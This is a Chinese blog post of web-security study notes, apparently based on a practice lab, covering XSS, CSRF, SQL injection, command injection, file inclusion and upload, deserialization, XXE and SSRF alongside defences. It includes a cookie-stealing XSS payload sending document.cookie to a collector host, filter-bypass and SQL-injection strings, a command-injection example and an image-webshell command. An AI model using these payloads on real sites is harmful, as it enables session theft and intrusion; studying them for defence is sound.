@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>webSecurity | Mkey的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="webSecurity">
+<meta property="og:type" content="article">
+<meta property="og:title" content="webSecurity">
+<meta property="og:url" content="https://monkeyh0ck.github.io/2021/12/01/webSecurity/index.html">
+<meta property="og:site_name" content="Mkey的博客">
+<meta property="og:description" content="webSecurity">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/12/01/webSecurity/image-20211201092213763.png">
+<meta property="article:published_time" content="2021-11-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-26T13:33:13.323Z">
+<meta property="article:author" content="HOU">
+<meta property="article:tag" content="web-security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://monkeyh0ck.github.io/2021/12/01/webSecurity/image-20211201092213763.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Mkey的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Mkey的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://monkeyh0ck.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-webSecurity" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/12/01/webSecurity/" class="article-date">
+  <time class="dt-published" datetime="2021-11-30T16:00:00.000Z" itemprop="datePublished">2021-12-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      webSecurity
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="webSecurity"><a href="#webSecurity" class="headerlink" title="webSecurity"></a>webSecurity</h1><span id="more"></span>
+
+<p>2021.12</p>
+<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul>
+<li>常用账号密码（弱口令），如常用用户名&#x2F;密码TOP 500等</li>
+<li>互联网上被脱裤后的账号密码（社工库）</li>
+<li>使用制定的字符使用工具按指定规则进行排列组合算法生成密码</li>
+</ul>
+<p>技巧</p>
+<ol>
+<li>根据注册提示信息进行优化</li>
+<li>管理后台，账户常为<code>admin/administrator/root</code></li>
+<li>登录返回的报错信息不通，可能透露账户名等</li>
+</ol>
+<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ol>
+<li>确认登录接口的脆弱性</li>
+<li>对字段进行优化</li>
+<li>工具自动化操作</li>
+</ol>
+<h3 id="防范暴力破解"><a href="#防范暴力破解" class="headerlink" title="防范暴力破解"></a>防范暴力破解</h3><ul>
+<li>验证码</li>
+<li>token</li>
+</ul>
+<h4 id="不安全验证码-on-cilent"><a href="#不安全验证码-on-cilent" class="headerlink" title="不安全验证码-on cilent"></a>不安全验证码-on cilent</h4><ul>
+<li>使用js代码实现验证码</li>
+<li>将验证码在cookie中泄露</li>
+<li>将验证码在前端代码中泄露</li>
+</ul>
+<h4 id="不安全验证码-on-server"><a href="#不安全验证码-on-server" class="headerlink" title="不安全验证码-on server"></a>不安全验证码-on server</h4><ul>
+<li>验证码在后台不过期，可长期使用</li>
+<li>验证码校验不严格，逻辑出现问题</li>
+<li>验证码设计太过简单和有规律，容易被猜解</li>
+</ul>
+<h4 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h4><ul>
+<li>设计安全的验证码</li>
+<li>对认证错误的提交进行技术并给出限制</li>
+<li>必要情况下，使用双因素认证</li>
+</ul>
+<h4 id="token"><a href="#token" class="headerlink" title="token"></a>token</h4><p>token一般是在网页刷新时生成，但是隐藏起来，提交时一并提交。</p>
+<p>token值输出在前端代码中，容易被获取，因此也失去防爆力破解的意义。</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>xss发生在web前端的漏洞，可以用来钓鱼攻击、前端js挖矿、用户cookie获取。甚至远程控制。</p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p><img src="/2021/12/01/webSecurity/image-20211201092213763.png" alt="image-20211201092213763"></p>
+<h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><ul>
+<li>反射型<ul>
+<li>一次性，不会存储在数据库中</li>
+</ul>
+</li>
+<li>存储型<ul>
+<li>存储在数据库中</li>
+</ul>
+</li>
+<li>DOM型<ul>
+<li>不与后台服务器产生数据交换，通过DOM操作前端代码输出的时候产生的问题</li>
+<li>一次性，也属于反射型</li>
+</ul>
+</li>
+</ul>
+<p><strong>危害</strong>:存储型-&gt;反射型-&gt;DOM型</p>
+<h3 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h3><p>程序对输入和输出的控制不够严格，导致脚本输入后，在输到前端时被浏览器当作有效代码解析执行，而产生危害</p>
+<h3 id="xss漏洞测试流程"><a href="#xss漏洞测试流程" class="headerlink" title="xss漏洞测试流程"></a>xss漏洞测试流程</h3><ol>
+<li>在目标站点找输入点，比如查询接口、留言板</li>
+<li>输入一组“特殊字符+唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理</li>
+<li>通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件（构造闭合）</li>
+<li>提交构造的脚本代码（各种绕过姿势），查看是否存在xss漏洞</li>
+</ol>
+<h5 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h5><ol>
+<li>一般查询接口容易出现反射型xss，留言板容易出现存储型xss</li>
+<li>由于后台可能存在过滤措施，构造script可能会被过滤掉，无法生效，或者环境限制了执行</li>
+<li>通过不同的script，尝试绕过后台过滤机制</li>
+</ol>
+<h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>get型，可以通过分享url实现攻击</p>
+<h4 id="cookie获取"><a href="#cookie获取" class="headerlink" title="cookie获取"></a>cookie获取</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location = &#x27;http://192.168.1.15/pkxss/cookie.php?cookie=&#x27; + document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>直接写入数据库，每次打开对应网站都会进行xss攻击</p>
+<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>DOM是访问HTML的标准编程接口</p>
+<h3 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h3><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><p>两个不同 域名之间不能使用js进行相互操作</p>
+<p>想跨域，需要管理员进行特殊配置</p>
+<p>header(“Access-Control-Allow kOrigin:x.com”)</p>
+<blockquote>
+<p>有些标签跨域加载资源是 不受同源策略限制的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src= &quot;&quot;&gt;	//js加载到本地执行</span><br><span class="line">&lt;img src= &quot;&quot;&gt;		//图片</span><br><span class="line">&lt;link href= &quot;&quot;&gt;		//css</span><br><span class="line">&lt;iframe src= &quot;&quot;&gt;	//任意资源</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>输入后直接传送给服务器，不在前端运行，当管理员打开对应网页，加载上传的数据时，执行xss。</p>
+<h3 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h3><h4 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h4><ol>
+<li>前端限制绕过，抓包重放，或修改前端代码</li>
+<li>大小写</li>
+<li>拼凑：<code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</code></li>
+<li>使用注释进行干扰<code>&lt;scr&lt;!--test--&gt;ipt&gt;</code></li>
+</ol>
+<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>将<code>&lt;script&gt;</code>标签经过编码转换成后台无法识别的编码，<strong>但发送给浏览器后会被识别，翻译为正常标签，执行脚本</strong></p>
+<ul>
+<li>html编码</li>
+</ul>
+<h4 id="htmlspecialchars-函数"><a href="#htmlspecialchars-函数" class="headerlink" title="htmlspecialchars() 函数"></a>htmlspecialchars() 函数</h4><p><code>htmlspecialchars()</code>函数把预定义字符转换成HTML实体</p>
+<p>预定义字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- &amp;       -&gt;	&amp;amp</span><br><span class="line">- &quot;       -&gt;    &amp;quot</span><br><span class="line">- &#x27;       -&gt;    &amp;#039</span><br><span class="line">- &lt;       -&gt;    &amp;lt</span><br><span class="line">- &gt;       -&gt;    &amp;gt</span><br></pre></td></tr></table></figure>
+
+<p>可用引号类型</p>
+<ul>
+<li>ENT_COMPAT					默认，仅编码双引号</li>
+<li>ENT_QUOTES					编码双引号和单引号</li>
+<li>ENT_NOQUOTES			  不编码任何引号</li>
+</ul>
+<h5 id="href标签注入防御措施"><a href="#href标签注入防御措施" class="headerlink" title="href标签注入防御措施"></a>href标签注入防御措施</h5><ul>
+<li>只允许http或https开头</li>
+<li>使用htmlspecialchars转义</li>
+</ul>
+<h5 id="js输出点"><a href="#js输出点" class="headerlink" title="js输出点"></a>js输出点</h5><p>攻击方法</p>
+<ul>
+<li>将之前的script标签闭合</li>
+</ul>
+<p>防御</p>
+<ul>
+<li>可以使用html实体编码，但是js并不会对其进行翻译，导致前端输出内容有问题</li>
+<li>应使用<code>\</code>对特殊字符进行转义</li>
+</ul>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限</p>
+<p>XSS是直接盗取了用户的权限，再实施攻击</p>
+<h3 id="如何判断CSRF漏洞"><a href="#如何判断CSRF漏洞" class="headerlink" title="如何判断CSRF漏洞"></a>如何判断CSRF漏洞</h3><ol>
+<li>对目标网站增删改的地方进行标记，判断请求是否可以被伪造<ol>
+<li>token会导致不容易被伪造</li>
+</ol>
+</li>
+<li>确认凭证的有效期</li>
+</ol>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul>
+<li>GET<ul>
+<li>构造url，发给用户，用户点击</li>
+</ul>
+</li>
+<li>POST<ul>
+<li>搭建恶意网站，点击恶意网站连接，触发提交表单</li>
+</ul>
+</li>
+</ul>
+<h3 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h3><ul>
+<li>添加token验证<ul>
+<li>对关键操作添加token参数，token值必须随机，每次不同</li>
+</ul>
+</li>
+<li>会话管理<ul>
+<li>不在客户端保留敏感信息</li>
+<li>会话过期机制</li>
+</ul>
+</li>
+<li>访问控制安全管理<ul>
+<li>敏感信息修改时，对身份进行二次验证</li>
+<li>敏感信息修改使用POST，不用GET</li>
+<li>使用http头部的referer限制原页面</li>
+</ul>
+</li>
+<li>添加验证码</li>
+</ul>
+<h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL Inject"></a>SQL Inject</h2><ul>
+<li><p>字符型</p>
+</li>
+<li><p>数字型</p>
+</li>
+<li><p>搜索型</p>
+<ul>
+<li><p>原理</p>
+<ul>
+<li><pre><code>select username,id,email from member where username like &#39;%$name%&#39;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  &#x27; and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line">  %&#x27; and 1=1 --&#x27;</span><br><span class="line">  %&#x27;and 1=1 and &#x27;%&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>xxx</p>
+<ul>
+<li><pre><code>select id,email from member where username=(&#39;$name&#39;)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#### PHP sql注入的万能密码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<p>‘ or 1&#x3D;1#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 数据库科</span><br><span class="line"></span><br><span class="line">- information_schema</span><br><span class="line">  - table</span><br><span class="line">  - column</span><br><span class="line"></span><br><span class="line">## RCE(远程代码执行)</span><br><span class="line"></span><br><span class="line">漏洞原因：应用系统从设计提供远程命令操作接口</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>例如：ping<br>ping 127.0.0.1 &amp; ipconfig</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 文件包含漏洞</span><br><span class="line"></span><br><span class="line">### 概念</span><br><span class="line"></span><br><span class="line">当前端用户可以选择包含文件时，就导致存在文件包含漏洞。文件包含漏洞分为**本地文件包含漏洞**和**远程文件包含漏洞**</span><br><span class="line"></span><br><span class="line">包含函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<?php include fuction.php?>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">包含函数通过include()或require()语句，将php文件插入另一个php，在处理错误方面存在不用：</span><br><span class="line"></span><br><span class="line">- require 会产生致命错误并停止脚本</span><br><span class="line">- include 只会产生警告，并且脚本会继续</span><br><span class="line"></span><br><span class="line">远程文件包含漏洞的前提：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在php.ini配置如下<br>allow_url_open&#x3D;on &#x2F;&#x2F;默认打开<br>Allow_url_include&#x3D;on &#x2F;&#x2F;默认关闭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">###  文件包含漏洞利用</span><br><span class="line"></span><br><span class="line">1. 制作一个图片马，通过文件上传漏洞上传</span><br><span class="line">2. 通过文件包含漏洞对该图片马进行包含</span><br><span class="line">3. 获取执行结果</span><br><span class="line"></span><br><span class="line">### 防护措施</span><br><span class="line"></span><br><span class="line">1. 在功能设计上尽量不要将文件包含函数对应的文件放给前端</span><br><span class="line"></span><br><span class="line">2. 过滤各种: `../../、http://、https://`</span><br><span class="line"></span><br><span class="line">3. 配置php.ini</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>   allwo_url_fopen &#x3D; off<br>   Allow_url_include &#x3D; off<br>   magic_quotes_gpc &#x3D; on<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. 白名单策略</span><br><span class="line"></span><br><span class="line">## 不安全的文件下载与上传</span><br><span class="line"></span><br><span class="line">文件下载功能设计不当，会导致攻击者可以构造文件路径，获取后台服务器上的其他敏感文件（任意文件下载）</span><br><span class="line"></span><br><span class="line">### 防范措施</span><br><span class="line"></span><br><span class="line">1. 对传入的文件名进行严格的过滤和限定</span><br><span class="line">2. 对文件下载的目录进行严格的限定</span><br><span class="line"></span><br><span class="line">### 不安全文件上传漏洞—服务端验证</span><br><span class="line"></span><br><span class="line">#### MIME</span><br><span class="line"></span><br><span class="line">多用途互联网邮件扩展楼型。</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>例如<br>.html  text&#x2F;html<br>.txt	application&#x2F;rtf<br>.gif	image&#x2F;gif<br>.jpg	image&#x2F;jpeg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p>$_FILES()<br>用来获取通过 POST 方法上传文件的相关信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20211203162546562](webSecurity.assets/image-20211203162546562.png)</span><br><span class="line"></span><br><span class="line">#### gitimagesize()</span><br><span class="line"></span><br><span class="line">文件头2个字节同类型相同。</span><br><span class="line"></span><br><span class="line">木马制作</span><br><span class="line"></span><br><span class="line">1. 直接伪造头部GIF89A</span><br><span class="line">2. CMD：`copy /b test.png + muma.php ccc.png`</span><br><span class="line">3. 使用GIMP，通过添加备注，写入执行命令</span><br><span class="line"></span><br><span class="line">#### 文件上传漏洞防范措施</span><br><span class="line"></span><br><span class="line">- 不在前端js实施上传限制策略</span><br><span class="line">- 通过服务器对上传文件进行限制</span><br><span class="line">  - 多条件组合限制：大小、路径、扩展名、文件类型、文件完整性</span><br><span class="line">  - 对上传的文件在服务器上存储时进行重命名</span><br><span class="line">  - 对服务器端上传文件的目录进行权限控制，限制执行权限带来的危害</span><br><span class="line"></span><br><span class="line">## 越权漏洞</span><br><span class="line"></span><br><span class="line">低权限账号完成高权限账号的操作</span><br><span class="line"></span><br><span class="line">- 平行越权：A用户和B用户属于同一级用户</span><br><span class="line">- 垂直越权：A用户权限高于B用户</span><br><span class="line"></span><br><span class="line">越权漏洞属于逻辑漏洞，是权限校验逻辑不够严谨导致</span><br><span class="line"></span><br><span class="line">## php反序列化</span><br><span class="line"></span><br><span class="line">**序列化serialize()**</span><br><span class="line">序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:            </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>class S&#123;
+    public $test=&quot;pikachu&quot;;
+&#125;
+$s=new S(); //创建一个对象
+serialize($s); //把这个对象进行序列化
+序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;
+    O:代表object
+    1:代表对象名字长度为一个字符
+    S:对象的名称
+    1:代表对象里面有一个变量
+    s:数据类型
+    4:变量名称的长度
+    test:变量名称
+    s:数据类型
+    7:变量值的长度
+    pikachu:变量值
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**反序列化unserialize()**</span><br><span class="line"></span><br><span class="line">就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);
+echo $u-&gt;test; //得到的结果为pikachu
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>    常见的几个魔法函数:
+    __construct()当一个对象创建时被调用
+
+    __destruct()当一个对象销毁时被调用
+
+    __toString()当一个对象被当作一个字符串使用
+
+    __sleep() 在对象在被序列化之前运行
+
+    __wakeup将在序列化之后立即被调用
+
+    漏洞举例:
+
+    class S&#123;
+        var $test = &quot;pikachu&quot;;
+        function __destruct()&#123;
+            echo $this-&gt;test;
+        &#125;
+    &#125;
+    $s = $_GET[&#39;test&#39;];
+    @$unser = unserialize($a);
+
+    payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;
+</code></pre>
+<pre><code>
+## XXE(xml external entity-injection)
+
+![image-20211205110135519](webSecurity.assets/image-20211205110135519.png)
+
+#### DTD：文档类型定义
+
+![image-20211205110235897](webSecurity.assets/image-20211205110235897.png)
+
+##### 外部应用
+
+外部应用可以支持http，file，ftp等协议
+
+如果一个接口支持xml数据，但没有安全措施，就可能导致XXE漏洞
+
+##### simplexml_load_string()
+
+函数转换形式良好的XML字符串为SimpleXMLElement对象
+
+php解析xml用libxml库，在2.9.0版本之后，默认禁止解析xml外部实体内容
+
+## SSRF
+
+攻击者向服务端发送包含恶意 URL 链接的请求，借由服务端去访问此 URL ，以获取受保护网络内的资源的一种安全漏洞。
+
+原因：服务器提供了从其他服务器应用获取数据的功能，但没有目标地址做出严格过滤和限制
+
+攻击者传入任意地址让服务器对其发起请求，并返回对目标地址请求的数据
+
+&gt; https://www.cnblogs.com/sunny11/p/13753754.html
+
+![image-20220411085144467](webSecurity.assets/image-20220411085144467.png)
+
+### 危害
+
+内网探测：对内网服务器、办公机进行端口扫描、资产扫描、漏洞扫描。
+
+窃取本地和内网敏感数据：访问和下载内网的敏感数据，利用 File 协议访问服务器本地文件。
+
+攻击服务器本地或内网应用：利用发现的漏洞进一步发起攻击利用。
+
+跳板攻击：借助存在 SSRF 漏洞的服务器对内或对外发起攻击，以隐藏自己真实 IP。
+
+绕过安全防御：比如防火墙、CDN（内容分发网络，比如加速乐、百度云加速、安全宝等等）防御。
+
+拒绝服务攻击：请求超大文件，保持链接 Keep-Alive Always。
+
+#### 如何判断存在ssrf
+
+1. 回显判断
+2. 访问日记检查
+3. 延时对比
+4. DNS请求检测
+
+#### 容易存在ssrf的场景
+
+凡是能够对外发起网络请求的地方，且地址可被用户可控的，都有可能存在 SSRF 漏洞。 
+
+RSS订阅、支持输入URL功能、嵌入远程图片、PFD文档解析功能，ffmpeg、imageMagic
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://monkeyh0ck.github.io/2021/12/01/webSecurity/" data-id="clfpg8ztr000tvwv56r5n7ktn" data-title="webSecurity" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/12/01/networkSecurity/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          网络安全训练营
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/11/01/SQLInject/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">SQL注入</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/web-security/" style="font-size: 10px;">web-security</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/Log4j/">Log4j</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/OWASP/">OWASP TOP 10</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/kali/">kali</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 HOU<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
